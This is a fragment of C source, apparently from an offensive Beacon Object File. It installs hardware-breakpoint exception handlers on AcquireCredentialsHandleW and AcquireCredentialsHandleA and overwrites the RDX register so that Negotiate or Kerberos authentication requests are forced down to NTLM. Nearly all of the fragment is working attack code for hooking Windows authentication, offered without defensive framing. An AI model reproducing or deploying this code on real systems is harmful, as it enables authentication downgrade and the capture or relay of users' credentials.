    if (pkg && is_readable(pkg, sizeof(wchar_t))) safe_wcs_to_utf8(pkg, pkgA, sizeof(pkgA));
    #ifndef BOF
        internal_printf("=====>AcquireCredentialsHandleW trap<======\n");
        internal_printf("[ACH] Package: %s\n", pkgA[0]?pkgA:"(null)");
    #endif
    if (g_forceNtlm) {
        static wchar_t g_ntlmW[8] = L"NTLM";
        BOOL okToForce = FALSE;
        if (!pkg) okToForce = TRUE;
        else if (is_readable(pkg, sizeof(wchar_t))) {
            if (safe_wcs_has_prefix_i(pkg, L"Negotiate") || safe_wcs_has_prefix_i(pkg, L"Kerberos")) okToForce = TRUE;
        }
        if (okToForce) {
            ex->ContextRecord->Rdx = (ULONG_PTR)g_ntlmW;
            #ifndef BOF
                internal_printf("[ACH]   ACTION: forced package to NTLM\n");
            #endif
        }
    }
    #endif

    // Clear debug state and resume
    ex->ContextRecord->EFlags |= 0x10000; // RF
    ex->ContextRecord->Dr6 = 0;
    return EXCEPTION_CONTINUE_EXECUTION;
}

// Separate VEH for AcquireCredentialsHandleA to keep logic isolated and clearer
static LONG CALLBACK ACH_A_VEH(EXCEPTION_POINTERS *ex) {
    if (ex->ExceptionRecord->ExceptionCode != 0x80000004 /* EXCEPTION_SINGLE_STEP */) return EXCEPTION_CONTINUE_SEARCH;
#ifdef _WIN64
    void* ip = (void*)ex->ContextRecord->Rip;
#else
    void* ip = (void*)ex->ContextRecord->Eip;
#endif
    // Ensure this DR hit is for our intended function
    if (g_hw_acha_addr && ip != g_hw_acha_addr) return EXCEPTION_CONTINUE_SEARCH;

#ifdef _WIN64
    const char* pkg = (const char*)ex->ContextRecord->Rdx; // AcquireCredentialsHandleA: RDX = package
    #ifndef BOF
        internal_printf("=====>AcquireCredentialsHandleA trap<======\n");
        internal_printf("[ACH] Package: %s\n", pkg ? pkg : "(null)");
    #endif
    if (g_forceNtlm) {
        static char g_ntlmA[8] = "NTLM";
        BOOL okToForce = FALSE;
        if (!pkg) okToForce = TRUE;
        else if (is_readable(pkg, 1)) {
            if (MSVCRT$_strnicmp(pkg, "Negotiate", 9) == 0 || MSVCRT$_strnicmp(pkg, "Kerberos", 8) == 0) okToForce = TRUE;
        }
        if (okToForce) {
            ex->ContextRecord->Rdx = (ULONG_PTR)g_ntlmA;
            #ifndef BOF
                internal_printf("[ACH]   ACTION: forced package to NTLM\n");
            #endif
        }
    }
    #endif

    // Clear debug state and resume
    ex->ContextRecord->EFlags |= 0x10000; // RF
    ex->ContextRecord->Dr6 = 0;
    return EXCEPTION_CONTINUE_EXECUTION;
}